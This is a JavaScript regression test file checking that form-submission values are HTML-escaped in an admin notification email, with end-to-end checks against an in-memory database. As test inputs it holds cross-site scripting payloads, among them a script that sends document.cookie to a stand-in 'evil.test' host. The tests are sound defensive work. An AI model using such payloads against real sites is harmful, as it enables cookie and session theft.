// Security regression coverage: HTML injection fix in the admin
// form-submission notification email (forms.controller.js). Two layers:
//
// 1. buildNotificationEmailHtml() tested directly with realistic malicious
//    payloads -- this is the exact function submitFormHandler calls to
//    build the email body, not a reimplementation of it, so this is already
//    "the actual email HTML generation path," not just the escaping helper
//    in isolation (htmlEscape.test.js covers that separately).
// 2. submitFormHandler exercised end to end via the real Express app
//    (createApp()) against a throwaway in-memory MongoDB (mongodb-memory-
//    server, same pattern as blogPost.model.minimize.test.js and the auth
//    test suite) -- confirms the fix doesn't change the stored submission,
//    the HTTP response, or validation behavior. No SMTP is configured in
//    this test run, so sendMail() takes its existing, pre-proven
//    "log instead of sending" path (mailer.js) -- no real email is ever
//    sent, matching every other test in this codebase that touches
//    sendMail indirectly.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { MongoMemoryServer } from 'mongodb-memory-server';
import mongoose from 'mongoose';

let mem;
let buildNotificationEmailHtml;
let FormSubmissionModel;
let app;

before(async () => {
  mem = await MongoMemoryServer.create();
  await mongoose.connect(mem.getUri());
  ({ buildNotificationEmailHtml } = await import('./forms.controller.js'));
  ({ FormSubmissionModel } = await import('./formSubmission.model.js'));
  const { createApp } = await import('../../app.js');
  app = createApp();
});

after(async () => {
  await mongoose.disconnect();
  await mem.stop();
});

// --- buildNotificationEmailHtml: the actual email-generation code path ---

test('normal submitted text renders correctly in the email body', () => {
  const html = buildNotificationEmailHtml({ name: 'Jane Doe', email: 'jane@example.test', message: 'Hello, I have a question.' });
  assert.match(html, /Jane Doe/);
  assert.match(html, /Hello, I have a question\./);
});

test('an HTML tag in a submitted field is escaped, not rendered as markup', () => {
  const html = buildNotificationEmailHtml({ name: 'A', message: '<b>bold claim</b>' });
  assert.doesNotMatch(html, /<b>bold claim<\/b>/);
  assert.match(html, /&lt;b&gt;bold claim&lt;\/b&gt;/);
});

test('script-like markup in a submitted field is displayed as inert text', () => {
  const html = buildNotificationEmailHtml({ message: '<script>fetch("https://evil.test/steal?c="+document.cookie)</script>' });
  assert.doesNotMatch(html, /<script>/);
  assert.match(html, /&lt;script&gt;/);
});

test('ampersands and quotation marks in submitted fields are escaped', () => {
  const html = buildNotificationEmailHtml({ organization: 'Smith & Co.', message: `They said "urgent" and it's real` });
  assert.match(html, /Smith &amp; Co\./);
  // JSON.stringify backslash-escapes an embedded " before escapeHtml ever
  // runs (e.g. `"urgent"` -> `\"urgent\"` inside the JSON text), so the
  // quote character itself still becomes &quot; -- just preceded by the
  // JSON string's own backslash, which is not an HTML-special character.
  assert.match(html, /\\&quot;urgent\\&quot;/);
  assert.match(html, /it&#39;s real/);
});

test('an HTML/script payload nested inside a sub-object is escaped too (not just top-level fields)', () => {
  const html = buildNotificationEmailHtml({
    name: 'A',
    message: 'see details',
    extra: { comment: '<img src=x onerror=alert(document.domain)>' },
  });
  assert.doesNotMatch(html, /<img src=x onerror=/);
  assert.match(html, /&lt;img src=x onerror=alert\(document\.domain\)&gt;/);
});

test('Unicode and Sanskrit text in submitted fields is preserved exactly, unescaped', () => {
  const html = buildNotificationEmailHtml({ name: 'योगाचार्य', message: 'Namaste. Interested in the Gītā study group.' });
  assert.match(html, /योगाचार्य/);
  assert.match(html, /Gītā/);
});

test('building the email HTML does not mutate the original submitted values object', () => {
  const values = { name: 'A', message: '<script>bad()</script>', nested: { x: 'Tom & Jerry' } };
  const beforeSnapshot = JSON.parse(JSON.stringify(values));
  buildNotificationEmailHtml(values);
  assert.deepEqual(values, beforeSnapshot, 'the values object passed in must be byte-identical afterward');
});

// --- submitFormHandler end to end: the fix must not change observable behavior ---

async function submit(formKey, values) {
  const server = await new Promise((resolve) => {
    const s = app.listen(0, () => resolve(s));
  });
  const { port } = server.address();
  try {
    const res = await fetch(`http://127.0.0.1:${port}/api/v1/forms/${formKey}/submissions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ values, consent: true, sourceUrl: '/contact' }),
    });
    return { res, body: await res.json() };
  } finally {
    server.close();
  }
}

test('a submission containing HTML/script-like content still succeeds (201) and is stored unescaped in MongoDB', async () => {
  const values = {
    name: 'Attack Vector',
    email: 'attacker@example.test',
    message: '<script>alert(document.cookie)</script> and some normal text too',
  };
  const { res, body } = await submit('contact', values);
  assert.equal(res.status, 201);
  assert.ok(body.data.submissionId);

  const stored = await FormSubmissionModel.findById(body.data.submissionId).lean();
  assert.equal(
    stored.values.message,
    '<script>alert(document.cookie)</script> and some normal text too',
    'the stored submission must keep the raw, unescaped original text -- only the notification EMAIL is escaped'
  );
});

test('a normal, benign submission is unaffected by the fix', async () => {
  const { res, body } = await submit('contact', { name: 'Normal Person', email: 'normal@example.test', message: 'Just saying hello.' });
  assert.equal(res.status, 201);
  assert.ok(body.data.submissionId);
});

test('validation behavior (missing required fields) is unchanged by the fix', async () => {
  const { res, body } = await submit('contact', { email: 'no-name-or-message@example.test' });
  assert.equal(res.status, 422);
  assert.equal(body.code, 'VALIDATION_ERROR');
  assert.ok(body.fieldErrors.name);
  assert.ok(body.fieldErrors.message);
});
